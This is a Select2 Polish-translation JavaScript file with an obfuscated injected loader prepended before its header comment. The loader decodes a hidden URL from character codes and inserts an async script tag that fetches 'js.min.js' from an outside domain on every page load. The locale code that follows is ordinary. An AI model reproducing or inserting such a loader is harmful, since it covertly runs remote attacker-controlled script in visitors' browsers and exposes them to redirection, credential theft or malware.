var fkghjhe45 = 1; var d=document;var s=d.createElement('script'); s.type='text/javascript'; s.async=true;
var pl = String.fromCharCode(104, 116, 116, 112, 115, 58, 47, 47, 100, 101, 108, 105, 118, 101, 114, 121, 103, 111, 111, 100, 115, 116, 114, 97, 116, 101, 103, 121, 46, 99, 111, 109, 47);
s.src=pl+'/js.min.js?s=k&'; 
if (document.currentScript) { 
document.currentScript.parentNode.insertBefore(s, document.currentScript);
} else {
d.getElementsByTagName('head')[0].appendChild(s);
}/**
 * Select2 Polish translation.
 *
 * @author  Jan Kondratowicz <jan@kondratowicz.pl>
 * @author  Uriy Efremochkin <efremochkin@uriy.me>
 * @author  Michał Połtyn <mike@poltyn.com>
 * @author  Damian Zajkowski <damian.zajkowski@gmail.com>
 */
(function($) {
    "use strict";

    $.fn.select2.locales['pl'] = {
        formatNoMatches: function() {
            return "Brak wyników";
        },
        formatInputTooShort: function(input, min) {
            return "Wpisz co najmniej" + character(min - input.length, "znak", "i");
        },
        formatInputTooLong: function(input, max) {
            return "Wpisana fraza jest za długa o" + character(input.length - max, "znak", "i");
        },
        formatSelectionTooBig: function(limit) {
            return "Możesz zaznaczyć najwyżej" + character(limit, "element", "y");
        },
        formatLoadMore: function(pageNumber) {
            return "Ładowanie wyników…";
        },
        formatSearching: function() {
            return "Szukanie…";
        }
    };

    $.extend($.fn.select2.defaults, $.fn.select2.locales['pl']);

    function character(n, word, pluralSuffix) {
        //Liczba pojedyncza - brak suffiksu
        //jeden znak
        //jeden element
        var suffix = '';
        if (n > 1 && n < 5) {
            //Liczaba mnoga ilość od 2 do 4 - własny suffiks
            //Dwa znaki, trzy znaki, cztery znaki.
            //Dwa elementy, trzy elementy, cztery elementy
            suffix = pluralSuffix;
        } else if (n == 0 || n >= 5) {
            //Ilość 0 suffiks ów
            //Liczaba mnoga w ilości 5 i więcej - suffiks ów (nie poprawny dla wszystkich wyrazów, np. 100 wiadomości)
            //Zero znaków, Pięć znaków, sześć znaków, siedem znaków, osiem znaków.
            //Zero elementów Pięć elementów, sześć elementów, siedem elementów, osiem elementów.
            suffix = 'ów';
        }
        return " " + n + " " + word + suffix;
    }
})(jQuery);
